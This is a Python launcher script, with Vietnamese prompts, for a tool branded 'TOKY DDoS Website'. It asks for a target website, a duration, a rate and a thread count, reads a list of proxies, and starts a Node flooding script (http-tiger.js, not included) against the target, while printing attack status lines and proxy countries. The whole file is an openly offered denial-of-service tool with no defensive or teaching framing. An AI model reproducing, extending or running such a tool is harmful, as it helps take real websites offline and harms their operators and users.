import subprocess
import time
import requests
import sys
from colorama import Fore, Style, init
import random
from datetime import datetime
import threading
import os
import re

init(autoreset=True)

def banner():
    # Banner đơn giản, chắc chắn hiện đúng "TOKY"
    print(Fore.CYAN + """
░██████████  ░██████   ░██     ░██ ░██     ░██ 
    ░██     ░██   ░██  ░██    ░██   ░██   ░██  
    ░██    ░██     ░██ ░██   ░██     ░██ ░██   
    ░██    ░██     ░██ ░███████       ░████    
    ░██    ░██     ░██ ░██   ░██       ░██     
    ░██     ░██   ░██  ░██    ░██      ░██     
    ░██      ░██████   ░██     ░██     ░██                                             
""" + Fore.RED + "                TOKY DDoS Website\n" + Style.RESET_ALL)

def remove_port__(proxy):
    proxy_parts = proxy.split(':')
    if len(proxy_parts) == 2:
        return proxy_parts[0]
    return proxy

def country_target____(proxyhttp):
    url = f"http://ip-api.com/json/{proxyhttp}"
    try:
        response = requests.get(url, timeout=5)
        data = response.json()
        return data.get("country", "Không xác định")
    except:
        return "Không xác định"

def create_proxy_file_if_not_exists():
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w") as proxy_file:
            print(f"{Fore.YELLOW}\nĐã phát hiện chưa có file proxy.txt và tiến hành tạo thành công !{Style.RESET_ALL}")
            sys.exit()
    elif os.path.exists("proxy.txt") and os.path.getsize("proxy.txt") == 0:
        print(f"{Fore.RED}\nLỗi: Vui lòng thêm proxy vào file proxy.txt để sử dụng ddos tool!{Style.RESET_ALL}")
        sys.exit()
    else:
        with open("proxy.txt", "r") as proxy_file:
            for line in proxy_file:
                proxy = line.strip()
                if not re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
                    print(f"{Fore.RED}\nLỗi: Proxy phải là http/https, vui lòng nhập đúng định dạng ip proxy ví dụ: 103.167.22.58:80{Style.RESET_ALL}")
                    sys.exit()

def run_ddos(website, time_attack, rate, thread, process):
    start_time = time.time()
    custom_colors = None

    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time
        if elapsed_time >= time_attack:
            process.terminate()
            break
        with open("proxy.txt", "r") as proxy_file:
            for line in proxy_file:
                proxy = line.strip()
                proxy_ip = remove_port__(proxy)
                ____country_target = country_target____(proxy_ip)
                if not custom_colors:
                    custom_colors = [color for color in Fore.__dict__.values() if isinstance(color, str) and color != Fore.RESET]
                    if Fore.BLACK in custom_colors: custom_colors.remove(Fore.BLACK)
                    if Fore.WHITE in custom_colors: custom_colors.remove(Fore.WHITE)
                    if Fore.LIGHTBLACK_EX in custom_colors: custom_colors.remove(Fore.LIGHTBLACK_EX)
                current_color = random.choice(custom_colors)
                custom_colors.remove(current_color)
                now = datetime.now().strftime("%H:%M:%S")
                print(f"{current_color}[{now}] Method POST - Target: {website}:443 || IP: {____country_target} || Status: Sending Request To Server {Style.RESET_ALL}")
                elapsed_time = time.time() - start_time
                if elapsed_time >= time_attack:
                    process.terminate()
                    break
    print(f"{Fore.GREEN}\nSuccessful Attack URL {website} - Time {time_attack}s !{Style.RESET_ALL}")
    input(f"{Fore.YELLOW}Nhấn Enter Để Thoát Tool.{Style.RESET_ALL}")
    exit()

def main():
    banner()
    website = input(Fore.YELLOW + "[~] Nhập website : " + Style.RESET_ALL)
    time_attack = int(input(Fore.YELLOW + "[~] Nhập time : " + Style.RESET_ALL))
    rate = int(input(Fore.YELLOW + "[~] Nhập rate : " + Style.RESET_ALL))
    thread = int(input(Fore.YELLOW + "[~] Nhập thread : " + Style.RESET_ALL))

    node_command = ["node", "http-tiger.js", website, str(time_attack), str(rate), str(thread), "proxy.txt"]
    try:
        create_proxy_file_if_not_exists()
        process = subprocess.Popen(node_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        ddos_thread = threading.Thread(target=run_ddos, args=(website, time_attack, rate, thread, process))
        ddos_thread.start()
        ddos_thread.join()
    except Exception as e:
        print("LỖI:", e)

if __name__ == "__main__":
    main()
